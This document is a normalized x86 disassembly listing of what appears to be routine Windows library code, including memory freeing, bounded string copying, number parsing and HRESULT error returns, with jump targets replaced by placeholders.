pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
push eax
call [ LocalFree@IAT ]
mov [ ebx + 0xc ] 0x0
lea edx [ ebp - 0x9c ]
mov eax 0xb3
call sub_10013830
mov [ ebp - 0xd8 ] 0x3
jmp r-xdata
lea esi [ ebp - 0xf8 ]
mov ecx ebx
call sub_10068700
mov esi [ eax ]
lea edi [ ebp - 0xf8 ]
call sub_10045ee0
mov eax [ ebp - 0xe8 ]
push esi
call sub_1004bb20
jmp r-xdata
test esi esi
je r-xdata
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
lea edx [ ebp - 0xa0 ]
mov eax 0xb9
call sub_10013830
mov ebx [ ebp - 0xdc ]
mov [ ebp - 0xd8 ] 0x3
jmp r-xdata
mov ecx [ ebp - 0xdc ]
lea esi [ ebp - 0x104 ]
call sub_1003adb0
mov esi [ eax ]
lea edi [ ebp - 0x104 ]
call sub_1005bb10
mov eax [ ebp - 0xe0 ]
push esi
call sub_10058fc0
mov ebx [ ebp - 0xdc ]
jmp r-xdata
lea eax [ ebp - 0x74 ]
push eax
push esi
call edi
test eax eax
je r-xdata
sub eax 0x2
jne r-xdata
lea esi [ ebp - 0xf8 ]
mov ecx ebx
call sub_1003adb0
mov ebx [ eax ]
mov eax [ ebp - 0xe0 ]
call sub_10020080
lea edi [ ebp - 0xf8 ]
mov esi eax
call sub_1005bb10
test esi esi
je r-xdata
lea edx [ ebp - 0xd4 ]
mov eax 0x78
jmp r-xdata
mov esi [ esi ]
jmp r-xdata
lea edx [ ebp - 0x88 ]
mov eax 0x120
call sub_10013830
lea edx [ ebp - 0x9c ]
mov eax 0x15d
mov [ ebp - 0xd8 ] 0x2
lea esi [ ebp - 0xf8 ]
mov ecx ebx
call sub_1003adb0
mov ebx [ eax ]
mov eax [ ebp - 0xe0 ]
call sub_10020080
lea edi [ ebp - 0xf8 ]
mov esi eax
call sub_1005bb10
test esi esi
je r-xdata
mov ebx [ ebp - 0xdc ]
mov [ ebp - 0xd8 ] 0x4
jmp r-xdata
mov ecx [ ebp - 0xdc ]
lea esi [ ebp - 0xf0 ]
call sub_1003adb0
mov esi [ eax ]
lea edi [ ebp - 0xf0 ]
call sub_1005bb10
mov eax [ ebp - 0xe0 ]
push esi
push eax
call sub_1001a830
mov ebx [ ebp - 0xdc ]
jmp r-xdata
lea edi [ ebp - 0xf0 ]
call sub_10045ee0
test esi esi
jne r-xdata
mov ecx [ ebp - 0xdc ]
lea esi [ ebp - 0xf0 ]
call sub_1003adb0
mov esi [ eax ]
lea edi [ ebp - 0xf0 ]
call sub_1005bb10
mov eax [ ebp - 0xe0 ]
mov ecx esi
call sub_10062c00
mov ebx [ ebp - 0xdc ]
jmp r-xdata
sub_1006bc40
push ecx
cmp [ edi ] 0x0
push ebx
push esi
je r-xdata
pop esi
pop ebx
pop ecx
retn
mov eax [ edi ]
mov esi [ eax ]
mov ebx [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax [ edi ]
push eax
call [ LocalFree@IAT ]
mov [ edi ] ebx
test ebx ebx
jne r-xdata
push esi
call sub_1005eed0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_1006bcb0
push ebp
mov ebp esp
push ecx
mov edx [ eax + 0x10 ]
push ebx
mov ebx [ eax + 0x14 ]
push edi
mov edi [ ecx + 0x10 ]
sub ebx edx
mov [ ebp - 0x4 ] 0x0
cmp edi ebx
jbe r-xdata
push 0xffffffff
push 0x0
push ecx
mov ecx eax
call sub_10035d20
mov ebx [ ecx + 0x14 ]
sub ebx edi
cmp ebx edx
jb r-xdata
push 0xffffffff
push 0x0
push eax
push 0x0
call sub_100215b0
jmp r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push eax
mov ecx esi
mov [ esi ] 0x0
call sub_1000adb0
pop edi
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1006bd20
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi ]
push edi
mov edi [ ebp + 0x8 ]
cmp eax 0x28
je r-xdata
lea ecx [ esi + 0x24 ]
push ecx
push edi
call sub_10052120
add esp 0x8
cmp eax 0x29
je r-xdata
cmp eax 0x18
jne r-xdata
push esi
push edi
call sub_10035fe0
add esp 0x8
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x18 ]
push eax
push edi
call sub_10035fe0
add esp 0x8
push esi
push edi
call sub_10035fe0
add esp 0x8
pop edi
pop esi
pop ebp
retn
sub_1006bd99
push 0x198
mov eax sub_10080167
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x18 ]
and [ ebp - 0x168 ] 0x0
cmp [ ebp + 0x14 ] 0x0
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1a0 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x184 ] ebx
mov ecx ebx
je r-xdata
lea eax [ ebp - 0x198 ]
push eax
call sub_100688a0
push eax
mov [ ebp - 0x4 ] 0x1
call sub_100599a6
pop ecx
lea ecx [ ebp - 0x198 ]
lea eax [ ebp - 0x19c ]
push eax
call sub_100688a0
and [ ebp - 0x4 ] 0x0
push eax
call sub_10011620
pop ecx
lea ecx [ ebp - 0x19c ]
jmp r-xdata
mov ecx [ ebp - 0x17c ]
cmp ecx 0x4
jae r-xdata
mov [ ebp - 0x174 ] eax
call sub_10069ce0
and [ ebp - 0x38 ] 0x0
push 0xf
pop edi
mov [ ebp - 0x161 ] 0x0
mov [ ebp - 0x16d ] 0x0
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x48 ] 0x0
and [ ebp - 0x54 ] 0x0
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x64 ] 0x0
mov ecx [ ebp - 0x174 ]
mov eax [ ecx ]
lea edx [ ebp - 0x18c ]
push edx
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x24 ]
and [ ebp - 0x17c ] 0x0
jmp r-xdata
cmp [ ebp - 0x161 ] 0x0
jne r-xdata
movsx eax [ ebp + ecx - 0x18c ]
sub eax 0x20
je r-xdata
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x64 ]
call sub_1002b580
jmp r-xdata
cmp [ ebp - 0x38 ] 0x1
jbe r-xdata
cmp ecx 0x3
je r-xdata
sub eax 0x4
je r-xdata
mov esi [ ebp - 0x1a0 ]
mov [ esi + 0x14 ] edi
lea eax [ ebp - 0x64 ]
xor edi edi
mov [ esi + 0x10 ] edi
push eax
mov ecx esi
mov [ esi ] 0x0
call sub_1000adb0
push edi
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_10041a20
push edi
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10041a20
mov eax esi
call sub_1004fa89
retn 0x14
cmp [ ebp - 0x16d ] 0x0
je r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
inc [ ebp - 0x17c ]
cmp [ ebp - 0x161 ] 0x0
push 0xf
pop edi
je r-xdata
mov ecx [ ebp - 0x184 ]
lea eax [ ebp - 0x190 ]
push eax
call sub_100688a0
push eax
mov [ ebp - 0x4 ] 0xd
call sub_1001b110
pop ecx
lea ecx [ ebp - 0x190 ]
mov edi eax
mov [ ebp - 0x4 ] 0x3
call sub_10069ce0
jmp r-xdata
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10028071
test [ ebx + 0x14 ] 0x8
mov [ ebp - 0x4 ] 0x4
jne r-xdata
sub eax 0x7
je r-xdata
push 0x2d
push 0x1
push 0x0
lea ecx [ ebp - 0x64 ]
call sub_1000bddb
mov ebx eax
lea eax [ ebp - 0x48 ]
mov ebx [ ebp - 0x184 ]
push [ ebp - 0x16c ]
mov ecx esi
call sub_1003b7cf
test al al
je r-xdata
cmp [ ebp - 0x17c ] 0x3
jne r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_1003b7cf
test al al
jne r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_1003b7cf
test al al
jne r-xdata
sub eax 0x4b
je r-xdata
mov ecx [ ebp - 0x38 ]
inc ebx
add ecx eax
cmp ebx ecx
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x38 ] 0x1
ja r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x9c ]
push eax
call sub_1004ff82
or [ ebp - 0x168 ] 0x1
cmp [ eax + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x5
jbe r-xdata
mov ebx [ ebp - 0x174 ]
mov eax [ ebx ]
and [ ebp - 0x178 ] 0x0
mov ecx ebx
call [ eax + 0x1c ]
mov [ ebp - 0x180 ] eax
lea eax [ ebp - 0x80 ]
push eax
mov ecx ebx
call sub_10051f6c
cmp [ ebp - 0x70 ] 0x0
mov [ ebp - 0x4 ] 0xb
je r-xdata
dec eax
dec eax
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_1003b7cf
test al al
jne r-xdata
movzx eax [ esi + 0x5 ]
mov ecx [ edi + 0x10 ]
test [ ecx + eax * 2 ] 0x48
je r-xdata
mov ecx esi
call sub_10004056
mov edi eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
push [ ebp - 0x16c ]
mov ecx esi
call sub_1003b7cf
test al al
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov al [ esi + 0x5 ]
mov ecx [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_10004056
mov [ ebp - 0x162 ] 0x0
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x144 ]
push eax
call sub_1004ff82
or [ ebp - 0x168 ] 0x2
cmp [ eax + 0x14 ] 0x10
mov [ ebp - 0x4 ] 0x6
jb r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_1003b7cf
test al al
je r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
mov bl al
test bl bl
je r-xdata
mov ecx [ ebp - 0x38 ]
add ecx eax
cmp ebx ecx
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x4 ] al
jne r-xdata
mov ecx esi
call sub_10066573
push [ ebp - 0x16c ]
mov ecx esi
call sub_1003b7cf
test al al
je r-xdata
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_1002b580
cmp [ esi + 0x4 ] al
jne r-xdata
cmp al [ ecx ]
jne r-xdata
lea ecx [ ebp - 0x2c ]
test [ ebp - 0x168 ] 0x1
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x168 ] 0xfffffffd
push ebx
push 0x1
lea ecx [ ebp - 0x144 ]
call sub_10041a20
mov edi eax
mov edi [ eax ]
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x174 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
push [ ebp - 0x16c ]
mov ecx esi
mov bl al
call sub_1003b7cf
test al al
jne r-xdata
cmp [ ebp - 0x6c ] 0x10
mov eax [ ebp - 0x80 ]
jae r-xdata
mov al [ esi + 0x5 ]
cmp al [ ebx ]
jne r-xdata
mov ecx esi
call sub_10004056
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov al [ esi + 0x5 ]
mov ecx [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_10004056
cmp [ ebp - 0x162 ] 0x0
je r-xdata
and [ ebp - 0x168 ] 0xfffffffe
push ebx
push 0x1
lea ecx [ ebp - 0x9c ]
call sub_10041a20
mov al [ esi + 0x5 ]
mov [ ebp - 0x162 ] 0x1
cmp [ edi ] al
je r-xdata
mov ecx esi
call sub_10004056
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_10004056
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
cmp [ eax ] 0x7f
jae r-xdata
lea eax [ ebp - 0x80 ]
mov ecx esi
call sub_10066573
jmp r-xdata
add eax [ ebp - 0x1c ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x2c ]
add eax [ ebp - 0x1c ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x2c ]
cmp al [ ecx ]
je r-xdata
lea ecx [ ebp - 0x2c ]
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x128 ]
push eax
call sub_100202c4
or [ ebp - 0x168 ] 0x4
mov [ ebp - 0x4 ] 0x8
cmp [ eax + 0x10 ] ebx
jbe r-xdata
mov ecx esi
call sub_10066573
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0xb8 ]
push eax
call sub_1004ff82
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x7
call sub_1000adb0
push ebx
lea ecx [ ebp - 0xb8 ]
jmp r-xdata
xor ebx ebx
test [ ebp - 0x168 ] 0x2
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x180 ]
cmp [ ebp - 0x178 ] eax
jge r-xdata
mov [ ebp - 0x161 ] 0x1
jmp r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
and [ ebp - 0x1c ] 0x0
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x2c ] 0x0
call sub_10006560
push [ ebp - 0x16c ]
mov ecx esi
mov [ ebp - 0x4 ] 0xc
xor edi edi
call sub_1003b7cf
test al al
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x161 ] 0x1
mov [ ebp - 0x162 ] 0x0
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0xf0 ]
push eax
call sub_100202c4
or [ ebp - 0x168 ] 0x8
cmp [ eax + 0x14 ] 0x10
mov [ ebp - 0x4 ] 0x9
jb r-xdata
push 0x1
mov [ ebp - 0x4 ] 0x3
call sub_10041a20
jmp r-xdata
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_10004056
lea ecx [ ebp - 0x80 ]
jmp r-xdata
mov edi eax
sub edi [ ebp - 0x178 ]
cmp [ esi + 0x5 ] bl
jne r-xdata
mov ecx esi
call sub_10004056
cmp [ ebp - 0x6c ] 0x10
mov edx [ ebp - 0x80 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov al [ esi + 0x5 ]
cmp al [ edi ]
jne r-xdata
mov ecx esi
call sub_10004056
test [ ebp - 0x168 ] 0x4
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x168 ] 0xfffffff7
push ebx
push 0x1
lea ecx [ ebp - 0xf0 ]
call sub_10041a20
mov edi eax
mov edi [ eax ]
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
push 0x30
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_1003f510
dec edi
jne r-xdata
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x161 ] 0x0
jne r-xdata
lea edx [ ebp - 0x80 ]
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_10004056
mov ecx esi
inc edi
call sub_10066573
cmp [ ebp - 0x162 ] 0x0
je r-xdata
and [ ebp - 0x168 ] 0xfffffffb
push ebx
push 0x1
lea ecx [ ebp - 0x128 ]
call sub_10041a20
mov al [ esi + 0x5 ]
mov [ ebp - 0x162 ] 0x1
cmp [ edi ] al
je r-xdata
mov ecx esi
call sub_10004056
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov al [ esi + 0x5 ]
mov [ ebp - 0x188 ] al
push [ ebp - 0x188 ]
lea ecx [ ebp - 0x64 ]
push 0x1
call sub_1003f510
mov ecx esi
call sub_10066573
mov ecx esi
call sub_10004056
mov ecx esi
call sub_10066573
push [ ebp - 0x16c ]
mov ecx esi
call sub_1003b7cf
test al al
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10041a20
test edi edi
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0xd4 ]
push eax
call sub_1004ff82
mov edi [ eax + 0x10 ]
push ebx
push 0x1
lea ecx [ ebp - 0xd4 ]
call sub_10041a20
cmp edi ebx
je r-xdata
mov ecx esi
call sub_10066573
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x160 ]
push eax
call sub_100202c4
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xa
call sub_1000adb0
push ebx
push 0x1
lea ecx [ ebp - 0x160 ]
mov [ ebp - 0x4 ] 0x3
call sub_10041a20
jmp r-xdata
test [ ebp - 0x168 ] 0x8
je r-xdata
mov eax [ ebp - 0x178 ]
cmp eax [ ebp - 0x180 ]
jge r-xdata
mov eax [ ebp - 0x180 ]
cmp [ ebp - 0x178 ] eax
jge r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0xb
call sub_10041a20
jmp r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + edi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_10004056
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x10c ]
push eax
call sub_100202c4
mov edi [ eax + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x10c ]
call sub_10041a20
test edi edi
jne r-xdata
mov [ ebp - 0x16d ] 0x1
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x161 ] 0x1
dec edi
je r-xdata
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_10004056
test edi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x5 ] bl
jne r-xdata
mov ecx esi
call sub_10004056
mov al [ esi + 0x5 ]
mov [ ebp - 0x194 ] al
push [ ebp - 0x194 ]
lea ecx [ ebp - 0x64 ]
push 0x1
call sub_1003f510
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_10004056
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + edi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + edi ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1003f510
inc edi
cmp [ eax + edi ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_10004056
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x161 ] 0x1
mov [ ebp - 0x161 ] 0x1
inc edi
jmp r-xdata
mov ecx esi
call sub_10066573
push [ ebp - 0x16c ]
mov ecx esi
call sub_1003b7cf
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ eax + edi ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov al [ esi + 0x5 ]
mov [ ebp - 0x1a4 ] al
push [ ebp - 0x1a4 ]
lea ecx [ ebp - 0x64 ]
push 0x1
call sub_1003f510
inc [ ebp - 0x178 ]
mov ecx esi
call sub_10004056
sub_1006c6d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
lea ebx [ esi + 0x4 ]
cmp ebx [ ebp + 0xc ]
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
mov edx [ ebx - 0x4 ]
lea esi [ ebx - 0x4 ]
push edx
push edi
call [ ebp + 0x10 ]
add esp 0x8
test eax eax
je r-xdata
mov eax ebx
sub eax esi
sar eax 0x2
add eax eax
add eax eax
push eax
mov ecx ebx
sub ecx eax
add ecx 0x4
push esi
push ecx
call sub_10078db0
add esp 0xc
mov [ esi ] edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ ebp + 0x8 ]
mov [ eax ] edi
mov ecx [ ebp - 0x4 ]
mov eax [ esi ]
mov [ ebp - 0x4 ] esi
mov [ ecx ] eax
mov edx [ esi - 0x4 ]
sub esi 0x4
push edx
push edi
call [ ebp + 0x10 ]
add esp 0x8
test eax eax
jne r-xdata
add ebx 0x4
cmp ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ esi ]
mov edi [ ebx ]
push eax
push edi
mov [ ebp - 0x4 ] ebx
call [ ebp + 0x10 ]
add esp 0x8
test eax eax
je r-xdata
pop edi
sub_1006c75b
push 0x28
mov eax sub_1007f2ec
call sub_100097c8
mov ebx [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp ebx edi
je r-xdata
push 0x5
pop eax
call sub_1004db01
retn
cmp [ ebx ] edi
jne r-xdata
push 0x14
call sub_10055606
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] edi
cmp esi edi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
cmp ecx edi
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_1004d460
mov [ esi + 0x4 ] edi
mov [ esi ] r--data
push eax
mov ecx esi
mov [ ebp - 0x10 ] 0x1
mov [ esi + 0x8 ] edi
call sub_1002141a
jmp r-xdata
sub_1006c7f0
push esi
mov esi [ ebx ]
test esi esi
je r-xdata
xor eax eax
mov [ ebx ] eax
mov [ ebx + 0x4 ] eax
mov [ ebx + 0x8 ] eax
pop esi
retn
push edi
mov edi [ ebx + 0x4 ]
cmp esi edi
je r-xdata
mov eax [ ebx ]
push eax
call sub_1006591f
add esp 0x4
pop edi
nop
call sub_10054dd0
sub esi 0xffffff80
cmp esi edi
jne r-xdata
sub_1006c830
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor eax eax
push edi
test esi esi
je r-xdata
pop edi
pop esi
mov eax 0x8007007a
mov [ ecx - 0x1 ] 0x0
pop ebx
pop ebp
retn 0x4
mov ebx [ ebp + 0x8 ]
mov edi edx
sub ebx ecx
test esi esi
jne r-xdata
mov dl [ ebx + ecx ]
test dl dl
je r-xdata
pop edi
pop esi
mov [ ecx ] al
pop ebx
pop ebp
retn 0x4
mov [ ecx ] dl
inc ecx
dec edi
dec esi
jne r-xdata
test edi edi
je r-xdata
pop edi
pop esi
mov eax 0x8007007a
mov [ ecx - 0x1 ] 0x0
pop ebx
pop ebp
retn 0x4
sub_1006c890
xor eax eax
test edx edx
je r-xdata
mov eax 0x80070057
cmp edx 0x7fffffff
jbe r-xdata
mov [ edi ] 0x0
retn
xor eax eax
push esi
mov esi edx
test edx edx
je r-xdata
test eax eax
js r-xdata
mov eax 0x80070057
cmp [ ecx ] ax
je r-xdata
pop esi
retn
test eax eax
js r-xdata
test esi esi
jne r-xdata
add ecx 0x2
dec esi
jne r-xdata
mov [ edi ] 0x0
sub edx esi
mov [ edi ] edx
pop esi
retn
test edi edi
je r-xdata
jmp r-xdata
sub_1006c8f0
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor eax eax
push edi
test esi esi
je r-xdata
sub ecx 0x2
mov eax 0x8007007a
mov ebx [ ebp + 0x8 ]
mov edi edx
sub ebx ecx
test esi esi
jne r-xdata
movzx edx [ ebx + ecx ]
test dx dx
je r-xdata
pop edi
xor edx edx
pop esi
mov [ ecx ] dx
pop ebx
pop ebp
retn 0x4
mov [ ecx ] dx
add ecx 0x2
dec edi
dec esi
jne r-xdata
test edi edi
je r-xdata
pop edi
sub ecx 0x2
xor edx edx
pop esi
mov eax 0x8007007a
mov [ ecx ] dx
pop ebx
pop ebp
retn 0x4
sub_1006c960
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
lea eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push 0x0
push ecx
push edx
push eax
call sub_10024154
add esp 0x14
pop ebp
retn
sub_1006c980
mov ecx 0x9
xor eax eax
test ecx ecx
jne r-xdata
add edx 0x2
dec ecx
jne r-xdata
test esi esi
je r-xdata
mov eax 0x80070057
cmp [ edx ] ax
je r-xdata
jmp r-xdata
retn
test eax eax
js r-xdata
mov [ esi ] 0x0
mov edx 0x9
sub edx ecx
mov [ esi ] edx
retn
sub_1006c9c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007edf0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x4c ] ebx
mov eax [ edi ]
cmp eax 0x2
jne r-xdata
cmp eax 0x1
jne r-xdata
mov edi [ edi + 0x10 ]
mov eax edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ esi ] bl
lea edx [ eax + 0x1 ]
push ebx
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ esi ] bl
push r--data
mov eax [ edi + 0x1c ]
cmp eax 0x7
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push edi
jmp r-xdata
cmp eax 0x6
je r-xdata
mov ecx esi
call sub_10043190
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001460
cmp [ edi + 0x14 ] 0x0
mov [ ebp - 0x4 ] ebx
jbe r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov ecx esi
mov [ esi ] 0x0
call sub_1000adb0
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov eax [ edi + 0x10 ]
mov ecx [ eax + ebx * 4 ]
push ecx
lea edx [ ebp - 0x48 ]
push edx
call sub_1006c9c0
add esp 0x8
mov [ ebp - 0x4 ] 0x1
test ebx ebx
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x2c ]
push edx
call sub_1006591f
add esp 0x4
jmp r-xdata
push 0xffffffff
push 0x0
lea edx [ ebp - 0x48 ]
push edx
lea ecx [ ebp - 0x2c ]
call sub_10035d20
cmp [ ebp - 0x34 ] 0x10
mov [ ebp - 0x4 ] 0x0
jb r-xdata
cmp [ ebp - 0x38 ] 0x0
je r-xdata
inc ebx
cmp ebx [ edi + 0x14 ]
jb r-xdata
mov eax [ ebp - 0x48 ]
push eax
call sub_1006591f
add esp 0x4
lea eax [ ebp - 0x4c ]
push eax
push 0xc
call sub_100372e0
lea eax [ ebp - 0x4c ]
add esp 0x8
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ ebp - 0x4c ]
push ecx
lea ecx [ ebp - 0x2c ]
call sub_10067f90
sub_1006cb40
push ebp
mov ebp esp
push 0xffffffff
push sub_1007ee3b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x84
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
cmp [ edi ] 0x1
mov [ ebp - 0x90 ] edi
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
push 0x5
call sub_100372e0
add esp 0x8
xor ebx ebx
cmp [ edi + 0x1c ] 0x26
jne r-xdata
xor esi esi
cmp [ edi + 0x14 ] ebx
jbe r-xdata
lea ecx [ ebp - 0x28 ]
push ecx
